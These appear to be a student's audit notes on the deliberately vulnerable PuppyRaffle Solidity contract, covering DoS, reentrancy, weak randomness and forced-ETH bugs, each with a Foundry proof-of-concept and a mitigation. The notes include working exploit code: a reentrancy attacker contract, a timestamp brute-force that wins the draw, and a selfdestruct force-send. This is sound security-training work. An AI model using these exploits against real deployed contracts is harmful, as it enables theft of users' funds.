### Before following the lesson, my marked places of potential bugs
- * line:-85:  // Check for duplicates
  * line:-86:  //m the loop in loop below, looks buggy to me.
- * line:-104: //m this line screams Reentrancy attack, because this is effect after interaction, wrong order of operations.
- * line:-130: //m wrong RNG source, using chainlink VRF for randomness would be better.
- * line:-135: //m this cast could overflow if fees exceed uint64 max value.
- * line:-149: //m using delete on dynamic array, seems wrong, should use players = new address[](0); i'll reserach this later
- * line:-157: the function benneth this lines
    /// @notice this function will withdraw the fees to the feeAddress
    //m since this function withdraws fees to feeAddress, it should have some access control, anyone can call this function as of now.
    //m the mode of checking balance against totalFees seems wrong, what if ETH is sent directly to the contract?
    //m there should be a better way to check if there are active players.
- * line:-177: //m this seems okay, however, i beleive no player should be of the 0 address.
- 
    



### About the project in my own words:

### Attack vector:

#### Report / Findings

- Style
### [S-#] TITLE (Root Cause + Impact)

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 
#

```diff DoS in Duplicate Player Checker

// Check for duplicates
        //m the loop in loop below, looks buggy to me.
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
```
```diff Prove of DoS
 
>  ///place the following test into `PuppyRaffleTest.t.sol`.

 function test_Denial_Of_Service_Attack() public 
    {
      // Entering the first 100 players
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        // Entering the second 100 players.
        address[] memory playersTwo = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            playersTwo[i] = address(i + numPlayers);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersTwo.length}(playersTwo);
    }
```

# Mitigation i created for the DoS attack above, though after confriming Patrics own, i realized i solved one problem and left one out.
```diff 
> /// adding mapping to test for duplicate entries
+    mapping(address => bool) public hasEntereed;
+    function enterRaffle(address[] memory newPlayers) public payable 
    {
        // Original code
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            address player = newPlayers[i];
        require(!hasEntereed[player], "Duplicate entry");
        hasEntereed[player] = true;
        players.push(player);

        }
    }
+  ///////////////////////////////////////////////////////////////////
    /// Testing Mitigation For DoS Via Gas Limit Attacks         ///
    ///////////////////////////////////////////////////////////////////

+   function testEnterRaffleGas_accordingToNPlayers() public 
    {
        // number of entrants to simulate
           uint256 numberOfPlayer = 10;
        // simulate entrants and fund their accounts   
            address entrant = address(10);
            vm.deal(entrant, entranceFee * numberOfPlayer);
            vm.prank(entrant);
        // create array of new players and populate it
            address [] memory newPlayer = new address[](numberOfPlayer);
            for (uint256 i = 0; i < numberOfPlayer; i++) {
                newPlayer[i] = address(uint160(i));
            }
            puppyRaffle.enterRaffle{value: entranceFee * numberOfPlayer}(newPlayer);

        // Now test gas for single entrant after many have entered
            //Single entrant 
            address entrant2 = address(11);
            vm.deal(entrant2, entranceFee);
            vm.prank(entrant2);

            address [] memory newPlayer2 = new address[](1);
            newPlayer2[0] = entrant2;

            puppyRaffle.enterRaffle{value: entranceFee}(newPlayer2);

        }     
 ```      
 # Patric Collin's Solution 
 2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.
3. 
 ```diff
    
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }
​
-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    }
```    

# Reentrancy Vulnerability in `PuppyRaffle::refund()`.
- This is my prove of code, before following Patric's Lessons.
>  ///place the following test into `PuppyRaffleTest.t.sol`.
```diff Prove of Reentrancy in refund() function of PuppyRaffle

    //////////////////////////////////////////////////////////////
    /// Reentrancy Attack on Refund ///
     /////////////////////////////////////////////////////////////

>     function test_RefundReentrancy() public {
        // Arrange
        //uint256 entranceFee = puppyRaffle.entranceFee();

        // Deploy the attacker contract with predicted player index (0 in this case).
        ReentrancyOnRefund attacker = new ReentrancyOnRefund(puppyRaffle, 0);

        // Fund the attacker contract with enough ETH to enter the raffle.
        vm.deal(address(attacker), entranceFee);

        // Act: Enter the raffle using the attacker contract.
        address[] memory players = new address[](1);
        players[0] = address(attacker);

        vm.prank(address(attacker));
        puppyRaffle.enterRaffle{value: entranceFee}(players);


        // Create an innocent user
        address innocent = makeAddr("innocent");

        // Fund the innocent user with entranceFee
        vm.deal(innocent, entranceFee);

        // Prepare the players array
        address [] memory innocentPlayers = new address[](1);
        innocentPlayers[0] = innocent;

        // Innocent user enters raffle
        vm.prank(innocent);
        puppyRaffle.enterRaffle{value: entranceFee}(innocentPlayers);


         // record balance before and after attack
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 raffleBalanceBefore = address(puppyRaffle).balance;

        // Act: Trigger the reentrancy attack.
        attacker.attack();

      

        // Assert: Check if the attacker's balance has increased and the raffle's balance has decreased.
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 raffleBalanceAfter = address(puppyRaffle).balance;


        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker's balance should have increased due to reentrancy attack");
        assertLt(raffleBalanceAfter, raffleBalanceBefore, "Raffle's balance should have decreased due to reentrancy attack");

     }


// Attacker Contract to test Reentrancy Vulnerability in the refund function of PuppyRaffle 
>    contract ReentrancyOnRefund 
    {
        PuppyRaffle public raffle;
        uint256 public playerIndex;
        uint256 public timesCalled;

        constructor(PuppyRaffle _raffle, uint256 _playerIndex) {
            raffle = _raffle;
            playerIndex = _playerIndex;
        }

        function attack() public {
            raffle.refund(playerIndex);
        }

        receive() external payable {
            if (timesCalled < 1) {
                timesCalled++;
                raffle.refund(playerIndex);
            }
        }
    }
```
# Mitigation for the Reentrancy
>1:-
 ```diff Change the order or this code

     function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);

        payable(msg.sender).sendValue(entranceFee);

-        players[playerIndex] = address(0); //m this line screams Reentrancy attack, because this is effect after interaction, wrong order of operations.
        emit RaffleRefunded(playerAddress);
    }

>2:-
You can also adopt Openzepplin methodes against Reentrancy.
```   

# Patric's Solution to Reentrancy.



# Predictable Randomness Vulnerability in `PuppyRaffle::refund()`.
- This is my proof of code, before following Patric's Lessons.
- >/// Place the following test into `PuppyRaffleTest.t.sol`.
```diff Proof of Predictable Randomness in *PuppyRaffle::selectWinner()*    
     ////////////////////////////////////////////////////////////////////
    /////Writing test to proof selectWinner is not random and is deterministic based on blockhash and timestamp///
    ///////////////////////////////////////////////////////////////////
    function testSelectWinnerIsDeterministic() public {
        address[] memory players = new address[](4);
    
        address playerA = address(0xA);
        address playerB = address(0xB);
        address playerC = address(0xC);
        address playerD = address(0xD);

        players[0] = playerA;
        players[1] = playerB;   
        players[2] = playerC;
        players[3] = playerD;

        vm.deal(playerA, entranceFee * 4);
        vm.deal(playerB, entranceFee);  
        vm.deal(playerC, entranceFee);
        vm.deal(playerD, entranceFee);

        // Player A enters the raffle with 4 players
        vm.prank(playerA);
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        // Advance time and block number to simulate end of raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);  
        vm.prank(playerA);
        
        // Calculate expected winner index based on the same logic used in the contract
        uint256 expectedWinnerIndex = uint256(keccak256(abi.encodePacked(playerA, block.timestamp, block.difficulty))) % 4;
        // Get the expected winner address from the players array
        address expectedWinner = puppyRaffle.players(expectedWinnerIndex);

        // Call selectWinner and get the actual winner
        vm.prank(playerA);
        puppyRaffle.selectWinner();
        address actualWinner = puppyRaffle.previousWinner();

        //
        assertEq(actualWinner, expectedWinner);

    }

```
```diff
// Test to brute force the timestamp to be the winner for player A within a reasonable time frame (1 day)
    function test_BruteForceToBeWinner() public {
        address[] memory players = new address[](4);

        address playerA = address(0xA);
        address playerB = address(0xB);
        address playerC = address(0xC);
        address playerD = address(0xD);

        address attacker = playerA; // Attacker is player A

        players[0] = playerA;
        players[1] = playerB;
        players[2] = playerC;
        players[3] = playerD;

        vm.deal(playerA, entranceFee * 4);
        vm.deal(playerB, entranceFee);  
        vm.deal(playerC, entranceFee);
        vm.deal(playerD, entranceFee);

        vm.prank(attacker);
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        uint256 raffleEnd = block.timestamp + duration + 1;

        uint256 start = raffleEnd;
        uint256 end = start + 1 days; // Brute force for the next hour
        uint256 winingTimestamp = 0;

        for (uint256 t = start; t < end; t++) {
            uint256 index = uint256(keccak256(abi.encodePacked(attacker, t, block.difficulty))) % players.length;

            if(players[index] == attacker) {
                winingTimestamp = t;
                break;
            }
        }
        assertTrue(winingTimestamp != 0, "Attacker cannot win within the given time range");

        vm.warp(winingTimestamp);
        vm.prank(attacker);
        puppyRaffle.selectWinner();

        address actualWinner = puppyRaffle.previousWinner();

        assertEq(actualWinner, attacker, "Attacker should be the winner");

    }

```

```diff Mitigation
This issue requires replacing synchronous on-chain randomness with an asynchronous verifiable randomness source such as Chainlink VRF.
```
# Patric Findings about this vulnerability and mitigation.


# Mishandling of ETH vulnerability found in `PuppyRaffle::withdrawFee()` function.
- This is my proof of code, before following Patric's Lessons.
- >/// Place the following test into `PuppyRaffleTest.t.sol`.
```diff
contract forceSend 
{
    constructor() payable {}

    function boom(address target) public {
        selfdestruct(payable(target));
    }
}

 //////////////////////////////////////////////////////////////////////////
   // Writting proof of code that withdrawFees() function can be DoS'd, via forced ETH, and withdrawFees() function can revert due to no activePlayers while calling withdrawFees() function.
   function test_withdrawFeesDoSViaForceSend() public 
   {
        
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        assertEq(address(puppyRaffle).balance, puppyRaffle.totalFees());

        forceSend attacker = new forceSend{value: 1 ether}();
        attacker.boom(address(puppyRaffle));

        assertGt(address(puppyRaffle).balance, puppyRaffle.totalFees());
        
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();   
   }

```

# Mitigation for the DoS found in the withdrawFee() function.
- 1.Do not check address(this).balance for logic

- 2.Use internal state variables to track:

        Active players

        Withdrawal status

- 3.Reset totalFees / mark withdrawn after withdrawal
- 4.Observation:
    withdrawFees() is callable by any address. While funds are sent to a fixed feeAddress, the lack of access control combined with fragile balance-based invariants can lead to permanent denial of service.

    Recommendation:
    Either restrict the function to a privileged role (e.g., owner) or ensure withdrawal conditions rely solely on internal state and are immune to external balance manipulation.
  
    

# Patric's findings about this withdrawFees() function DoS and Mitigation.
